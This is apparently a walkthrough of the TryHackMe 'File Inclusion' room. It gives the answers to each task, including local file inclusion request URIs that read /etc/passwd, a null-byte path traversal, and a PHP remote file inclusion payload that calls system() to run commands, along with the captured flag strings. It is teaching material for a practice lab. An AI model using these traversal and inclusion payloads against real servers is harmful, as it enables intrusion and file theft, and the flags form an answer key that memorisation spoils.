# File Inclusion

{% embed url="https://tryhackme.com/room/fileinc" %}
https://tryhackme.com/room/fileinc
{% endembed %}

## Task 3 Path Traversal <a href="#title" id="title"></a>

#### What function causes path traversal vulnerabilities in PHP?

{% hint style="success" %}
`file_get_contents`
{% endhint %}

## Task 4 Local File Inclusion - LFI

#### Give Lab #1 a try to read **/etc/passwd**. What would the request URI be?

![](<../../.gitbook/assets/Screenshot from 2022-03-30 23-04-13.png>)

{% hint style="success" %}
`/lab1.php?file=/etc/passwd`
{% endhint %}

#### In Lab #2, what is the directory specified in the include function?

![](<../../.gitbook/assets/Screenshot from 2022-03-30 23-08-23.png>)

{% hint style="success" %}
`includes`
{% endhint %}

## Task 5 Local File Inclusion - LFI #2

* The %00 trick is fixed and not working with PHP 5.3.4 and above.

#### Give Lab #3 a try to read /etc/passwd. What is the request look like?

![](<../../.gitbook/assets/Screenshot from 2022-03-30 23-13-43.png>)

{% hint style="success" %}
`/lab3.php?file=../../../../etc/passwd%00`
{% endhint %}

#### Which function is causing the directory traversal in Lab #4?

![](<../../.gitbook/assets/Screenshot from 2022-03-30 23-21-30.png>)

![](<../../.gitbook/assets/Screenshot from 2022-03-30 23-20-47.png>)

{% hint style="success" %}
`file_get_contents`
{% endhint %}

![](<../../.gitbook/assets/Screenshot from 2022-03-30 23-18-36.png>)

#### Try out Lab #6 and check what is the directory that has to be in the input field?

![](<../../.gitbook/assets/Screenshot from 2022-03-30 23-22-56.png>)

{% hint style="success" %}
`THM-profile`
{% endhint %}

#### Try out Lab #6 and read **/etc/os-release**. What is the **VERSION\_ID** value?

![](<../../.gitbook/assets/Screenshot from 2022-03-30 23-23-34 (1).png>)

{% hint style="success" %}
`12.04`
{% endhint %}

## Task 6 Remote File Inclusion - RFI

![](<../../.gitbook/assets/Screenshot from 2022-03-30 23-23-34.png>)

## Task 8 Challenge

#### Capture Flag1 at /etc/flag1

{% hint style="success" %}
`F1x3d-iNpu7-f0rrn`
{% endhint %}

![](<../../.gitbook/assets/Screenshot from 2022-03-30 23-53-19.png>)

#### Capture Flag2 at /etc/flag2

![](<../../.gitbook/assets/Screenshot from 2022-03-30 23-56-23.png>)

{% hint style="success" %}
`c00k13_i5_yuMmy1`
{% endhint %}

#### Capture Flag3 at /etc/flag3

![](<../../.gitbook/assets/Screenshot from 2022-03-31 06-47-12.png>)

{% hint style="success" %}
`P0st_1s_w0rk1in9`
{% endhint %}

#### Gain RCE in **Lab #Playground** /playground.php with RFI to execute the hostname command. What is the output?

```bash
<?php system("hostname"); ?>
```

![](<../../.gitbook/assets/Screenshot from 2022-03-31 00-28-55.png>)

{% hint style="success" %}
`lfi-vm-thm-f8c5b1a78692`
{% endhint %}
